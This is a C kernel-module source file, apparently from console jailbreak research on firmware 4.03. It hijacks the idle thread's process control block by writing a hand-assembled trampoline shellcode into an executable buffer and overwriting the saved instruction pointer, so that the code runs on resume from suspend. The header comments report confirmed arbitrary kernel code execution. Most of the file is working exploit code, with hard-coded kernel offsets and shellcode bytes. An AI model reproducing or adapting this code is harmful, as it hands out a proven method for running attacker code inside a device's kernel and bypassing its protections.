#include <stdint.h>

/*
 * pcb_overwrite v2 — Hijack idle PCB with trampoline → sw_return
 *
 * === CONFIRMED WORKING 2026-03-07 ===
 *   Phase 1 (fw_ver=0x403): Armed trampoline, overwrote pcb_rip ✓
 *   Suspend/resume: Console entered rest mode and resumed cleanly ✓
 *   Phase 2 (fw_ver=0x2): Sentinel 0x484A4B5F52414E21 ("HJK_RAN!") found ✓
 *   pcb_rip restored to sw_return by cpu_switch after trampoline ran ✓
 *   VERDICT: FULL SUCCESS — arbitrary kernel code execution via PCB hijack
 *
 * v1 LEARNED:
 *   - PCB overwrite succeeds (pcb_rip readback confirmed)
 *   - But nop_ret (bare `ret` gadget) skips sw_return cleanup → kernel panic
 *   - sw_return has critical cleanup (lock release, CR3 restore, etc.)
 *
 * v2 APPROACH — TRAMPOLINE:
 *   Instead of jumping to a bare `ret`, jump to a trampoline that:
 *     1. Writes a sentinel to kdata (proof we ran)
 *     2. Jumps to sw_return (lets kernel handle its own cleanup)
 *
 *   The trampoline is written into the exec_code buffer (malloc'd, NX-cleared
 *   by kldload). This memory persists across suspend/resume and is executable.
 *
 *   Trampoline shellcode (35 bytes):
 *     movabs rax, SENTINEL_VALUE    ; 48 B8 <8 bytes>
 *     movabs rcx, SENTINEL_ADDR    ; 48 B9 <8 bytes>
 *     mov    [rcx], rax            ; 48 89 01
 *     movabs rax, SW_RETURN_ADDR   ; 48 B8 <8 bytes>
 *     jmp    rax                   ; FF E0
 *
 *   Only clobbers rax (was just jmp target) and rcx (scratch, not in PCB).
 *   rsp and all callee-saved regs are preserved for sw_return.
 *
 * PHASES:
 *   fw_ver=0x403: Phase 1 — Build trampoline, overwrite pcb_rip, arm
 *   fw_ver=0x2:   Phase 2 — Verify post-resume: check sentinels + PCB
 *   fw_ver=0x3:   Phase 1 DRY RUN — snapshot only, NO writes
 *
 * Output layout — Phase 1 (ARM):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (1 = armed, 3 = dry run)
 *
 *   --- addresses ---
 *   [4]   pcpu0
 *   [5]   idlethread
 *   [6]   idle_pcb
 *   [7]   trampoline address (or nop_ret for dry run)
 *   [8]   original pcb_rip (sw_return)
 *   [9]   original pcb_rsp
 *   [10]  exec_code base
 *
 *   --- idle PCB snapshot (8 key fields) ---
 *   [12]  pcb_r15
 *   [13]  pcb_r14
 *   [14]  pcb_r13
 *   [15]  pcb_r12
 *   [16]  pcb_rbp
 *   [17]  pcb_rsp
 *   [18]  pcb_rbx
 *   [19]  pcb_rip
 *
 *   --- pcb_rip overwrite ---
 *   [20]  pcb_rip BEFORE overwrite
 *   [21]  pcb_rip AFTER overwrite (readback)
 *   [22]  overwrite target (trampoline addr)
 *
 *   --- kdata sentinel ---
 *   [24]  sentinel address (kdata+0x400)
 *   [25]  sentinel value (pre-written 0, trampoline will write real one)
 *
 *   [30]  sentinel 0xdeadbeefcafe00BB
 *
 * Output layout — Phase 2 (VERIFY):
 *   [0]   magic "PCBO" (0x5043424F) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   phase (2)
 *
 *   --- post-resume state ---
 *   [4]   pcpu0
 *   [5]   curthread (post-resume)
 *   [6]   idlethread
 *   [7]   idle_pcb
 *
 *   --- current idle PCB (8 key fields) ---
 *   [10]  pcb_r15
 *   [11]  pcb_r14
 *   [12]  pcb_r13
 *   [13]  pcb_r12
 *   [14]  pcb_rbp
 *   [15]  pcb_rsp
 *   [16]  pcb_rbx
 *   [17]  pcb_rip  (*** did cpu_switch update this? ***)
 *
 *   --- kdata persistence checks ---
 *   [20]  kdata+0x400 sentinel (should be HIJACK_SENTINEL if trampoline ran!)
 *   [21]  kdata+0x200 snap_magic (from pcb_diff, if still there)
 *
 *   --- pcb_rip analysis ---
 *   [24]  pre-overwrite pcb_rip (from kdata+0x410 backup)
 *   [25]  current pcb_rip
 *   [26]  sw_return address (computed)
 *   [27]  1 if pcb_rip restored to sw_return → HIJACK CONFIRMED
 *         2 if pcb_rip is still trampoline → trampoline persisted but didn't run
 *         3 if pcb_rip is something else
 *
 *   [30]  sentinel 0xdeadbeefcafe00CC
 */

#define MAGIC_PCBO       0x5043424F  /* "PCBO" */
#define HIJACK_SENTINEL  0x484A4B5F52414E21ULL  /* "HJK_RAN!" */

/* FW 4.03 offsets */
#define PCPU_ARRAY_OFF       0x64d2280
#define SW_RETURN_OFF        (-0x5A16AB)   /* sw_return relative to kdata_base */

/* pcpu offsets */
#define PC_CURTHREAD     0x00
#define PC_IDLETHREAD    0x08

/* thread / PCB offsets */
#define TD_PCB           0x3f8
#define PCB_R15          0x00
#define PCB_R14          0x08
#define PCB_R13          0x10
#define PCB_R12          0x18
#define PCB_RBP          0x20
#define PCB_RSP          0x28
#define PCB_RBX          0x30
#define PCB_RIP          0x38

/* kdata persistence locations */
#define KDATA_SENT_OFF   0x400   /* sentinel — trampoline writes here on resume */
#define KDATA_BACKUP_OFF 0x410   /* backup of original pcb_rip */

#define MIN_KERN_ADDR    0xFFFF800000000000ULL

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
    uint32_t data_size;
    uint64_t exec_code;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

/*
 * Build trampoline shellcode at `dest`:
 *   movabs rax, sentinel_val     ; 48 B8 <8>
 *   movabs rcx, sentinel_addr   ; 48 B9 <8>
 *   mov    [rcx], rax           ; 48 89 01
 *   movabs rax, sw_return_addr  ; 48 B8 <8>
 *   jmp    rax                  ; FF E0
 *
 * Total: 35 bytes. Returns trampoline size.
 */
static int build_trampoline(uint64_t dest, uint64_t sentinel_addr,
                            uint64_t sentinel_val, uint64_t sw_return_addr)
{
    volatile uint8_t* p = (volatile uint8_t*)dest;
    int i = 0;

    /* movabs rax, sentinel_val */
    p[i++] = 0x48; p[i++] = 0xB8;
    for (int b = 0; b < 8; b++) p[i++] = (sentinel_val >> (b * 8)) & 0xFF;

    /* movabs rcx, sentinel_addr */
    p[i++] = 0x48; p[i++] = 0xB9;
    for (int b = 0; b < 8; b++) p[i++] = (sentinel_addr >> (b * 8)) & 0xFF;

    /* mov [rcx], rax */
    p[i++] = 0x48; p[i++] = 0x89; p[i++] = 0x01;

    /* movabs rax, sw_return_addr */
    p[i++] = 0x48; p[i++] = 0xB8;
    for (int b = 0; b < 8; b++) p[i++] = (sw_return_addr >> (b * 8)) & 0xFF;

    /* jmp rax */
    p[i++] = 0xFF; p[i++] = 0xE0;

    return i;  /* 35 */
}

static void phase1_arm(uint64_t kdata_base, uint64_t exec_code,
                       uint32_t data_size, volatile uint64_t* out,
                       volatile uint32_t* out32, int dry_run)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t sw_return = kdata_base + SW_RETURN_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Trampoline location: right after payload code in exec_code buffer */
    uint64_t trampoline_addr = exec_code + data_size;
    /* Align to 16 bytes for good measure */
    trampoline_addr = (trampoline_addr + 15) & ~15ULL;

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = dry_run ? 3 : 1;

    out[4] = pcpu0;
    out[5] = idlethread;

    /* Get idle PCB */
    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[6] = idle_pcb;
    out[7] = trampoline_addr;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;  /* error: invalid idle_pcb */
        out[30] = 0xdeadbeefcafe00BBULL;
        return;
    }

    /* Read current idle PCB state */
    uint64_t orig_rip = read8(idle_pcb + PCB_RIP);
    uint64_t orig_rsp = read8(idle_pcb + PCB_RSP);

    out[8]  = orig_rip;
    out[9]  = orig_rsp;
    out[10] = exec_code;

    /* Snapshot 8 key PCB fields */
    out[12] = read8(idle_pcb + PCB_R15);
    out[13] = read8(idle_pcb + PCB_R14);
    out[14] = read8(idle_pcb + PCB_R13);
    out[15] = read8(idle_pcb + PCB_R12);
    out[16] = read8(idle_pcb + PCB_RBP);
    out[17] = read8(idle_pcb + PCB_RSP);
    out[18] = read8(idle_pcb + PCB_RBX);
    out[19] = read8(idle_pcb + PCB_RIP);

    /* Record what we're about to do */
    out[20] = orig_rip;  /* BEFORE */

    if (!dry_run) {
        /* Verify orig_rip looks like sw_return (sanity check) */
        uint64_t expected_sw = kdata_base + SW_RETURN_OFF;
        if (orig_rip != expected_sw) {
            out32[1] = 0xFD;  /* error: unexpected pcb_rip */
            out[21] = orig_rip;
            out[22] = expected_sw;
            out[30] = 0xdeadbeefcafe00BBULL;
            return;
        }

        /* Build trampoline shellcode in exec_code buffer */
        uint64_t sentinel_addr = kdata_base + KDATA_SENT_OFF;
        int tsize = build_trampoline(trampoline_addr, sentinel_addr,
                                     HIJACK_SENTINEL, sw_return);

        /* Backup original pcb_rip to kdata */
        write8(kdata_base + KDATA_BACKUP_OFF, orig_rip);
        write8(kdata_base + KDATA_BACKUP_OFF + 8, trampoline_addr);

        /* Clear kdata sentinel (trampoline will set it on resume) */
        write8(sentinel_addr, 0);

        /* === THE OVERWRITE === */
        write8(idle_pcb + PCB_RIP, trampoline_addr);

        /* Readback to confirm */
        out[21] = read8(idle_pcb + PCB_RIP);
        out[22] = trampoline_addr;

        out[24] = sentinel_addr;
        out[25] = 0;  /* sentinel not yet set — trampoline sets it on resume */

        /* Report trampoline details */
        out[26] = sw_return;
        out[27] = (uint64_t)tsize;
    } else {
        /* DRY RUN: snapshot only */
        out[21] = orig_rip;
        out[22] = trampoline_addr;
        out[24] = kdata_base + KDATA_SENT_OFF;
        out[25] = 0;
        out[26] = kdata_base + SW_RETURN_OFF;
        out[27] = 0;
    }

    out[30] = 0xdeadbeefcafe00BBULL;
    out32[1] = 0x0001;
}

static void phase2_verify(uint64_t kdata_base, volatile uint64_t* out,
                          volatile uint32_t* out32)
{
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t sw_return = kdata_base + SW_RETURN_OFF;

    uint64_t pcpu0 = kdata_base + PCPU_ARRAY_OFF;
    uint64_t curthread  = read8(pcpu0 + PC_CURTHREAD);
    uint64_t idlethread = read8(pcpu0 + PC_IDLETHREAD);

    /* Header */
    out32[0] = MAGIC_PCBO;
    out32[1] = 0xAAAA;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = 2;

    out[4] = pcpu0;
    out[5] = curthread;
    out[6] = idlethread;

    uint64_t idle_pcb = 0;
    if (idlethread >= MIN_KERN_ADDR)
        idle_pcb = read8(idlethread + TD_PCB);

    out[7] = idle_pcb;

    if (idle_pcb < MIN_KERN_ADDR) {
        out32[1] = 0xFE;
        out[30] = 0xdeadbeefcafe00CCULL;
        return;
    }

    /* Read current idle PCB */
    out[10] = read8(idle_pcb + PCB_R15);
    out[11] = read8(idle_pcb + PCB_R14);
    out[12] = read8(idle_pcb + PCB_R13);
    out[13] = read8(idle_pcb + PCB_R12);
    out[14] = read8(idle_pcb + PCB_RBP);
    out[15] = read8(idle_pcb + PCB_RSP);
    out[16] = read8(idle_pcb + PCB_RBX);
    out[17] = read8(idle_pcb + PCB_RIP);

    /* kdata persistence checks */
    uint64_t sentinel = read8(kdata_base + KDATA_SENT_OFF);
    out[20] = sentinel;
    out[21] = read8(kdata_base + 0x200);  /* pcb_diff snap_magic */

    /* pcb_rip analysis */
    uint64_t backed_up_rip = read8(kdata_base + KDATA_BACKUP_OFF);
    uint64_t trampoline_addr = read8(kdata_base + KDATA_BACKUP_OFF + 8);
    uint64_t current_rip = read8(idle_pcb + PCB_RIP);

    out[24] = backed_up_rip;    /* original sw_return (saved in phase 1) */
    out[25] = current_rip;      /* current pcb_rip */
    out[26] = sw_return;        /* computed sw_return this boot */

    /*
     * Analysis:
     * 1 = pcb_rip restored to sw_return AND sentinel == HIJACK_SENTINEL
     *     → FULL SUCCESS: trampoline ran, wrote sentinel, jumped to sw_return,
     *       kernel continued normally, cpu_switch re-saved sw_return into PCB
     *
     * 2 = pcb_rip restored to sw_return but sentinel != HIJACK_SENTINEL
     *     → Partial: cpu_switch ran but trampoline didn't write sentinel?
     *
     * 3 = pcb_rip still == trampoline_addr
     *     → Trampoline persisted but cpu_switch hasn't run with this PCB yet
     *
     * 4 = pcb_rip is something else
     *     → Unexpected
     */
    if (current_rip == sw_return && sentinel == HIJACK_SENTINEL)
        out[27] = 1;  /* FULL SUCCESS */
    else if (current_rip == sw_return)
        out[27] = 2;  /* sw_return restored but sentinel missing */
    else if (current_rip == trampoline_addr)
        out[27] = 3;  /* trampoline still in PCB */
    else
        out[27] = 4;  /* something else */

    out[30] = 0xdeadbeefcafe00CCULL;
    out32[1] = 0x0001;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    uint32_t data_size = args->data_size;
    uint64_t exec_code = args->exec_code;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 280; i++)
        out[i] = 0;

    if (mode == 0x403) {
        phase1_arm(kdata_base, exec_code, data_size, out, out32, 0);
    } else if (mode == 0x3) {
        phase1_arm(kdata_base, exec_code, data_size, out, out32, 1);
    } else if (mode == 0x2) {
        phase2_verify(kdata_base, out, out32);
    } else {
        out32[0] = MAGIC_PCBO;
        out32[1] = 0xFF;
        out[1] = kdata_base;
        out[30] = 0xdeadbeefcafe00BBULL;
    }

    return 0;
}
